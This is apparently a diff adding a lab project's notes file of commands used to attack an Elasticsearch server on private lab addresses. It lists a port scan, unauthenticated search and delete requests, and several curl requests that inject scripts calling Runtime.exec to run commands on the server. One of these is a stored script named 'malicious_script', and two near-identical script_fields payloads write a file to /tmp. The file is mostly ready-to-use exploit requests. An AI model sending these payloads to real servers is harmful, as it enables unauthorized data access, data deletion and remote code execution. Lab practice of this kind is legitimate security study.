@@ -1,0 +1,59 @@
+Some command used in the project to perform varios attacks tasks:
+
+
+nmap -p 9200 192.168.56.105
+
+
+curl -X GET http://192.168.56.105:9200/_search
+
+
+
+curl -X POST "http://192.168.56.105:9200/_search" -H 'Content-Type: application/json' -d'
+{
+    "query": {
+        "match_all": {}
+    }
+}'
+
+
+
+curl -X DELETE http://192.168.56.105:9200/_search
+
+
+
+
+curl -X PUT "http://192.168.56.105:9200/_scripts/malicious_script" -H 'Content-Type: application/json' -d'
+{
+  "script": {
+    "lang": "painless",
+    "source": "Runtime.exec(\"malicious_command\")"
+  }
+}'
+
+
+
+curl -X POST "http://192.168.235.130:9201/_search?pretty" -H "Content-Type: application/json" -d '
+{
+  "size": 1,
+  "script_fields": {
+    "test": {       
+      "script": "java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"echo 'hello from attacker' > /tmp/attacker_file.txt\").getText()"
+    }
+  }  
+}'
+
+
+
+
+curl -XPOST 'http://192.168.235.130:9201/_search?pretty' -H 'Content-Type: application/json' -d '
+{
+  "size": 1,
+  "script_fields": {
+    "test": {
+      "script": "java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"echo 'hello from attacker' > /tmp/attacker_file.txt\").getText()"
+    }
+  }
+}'
+
+
+
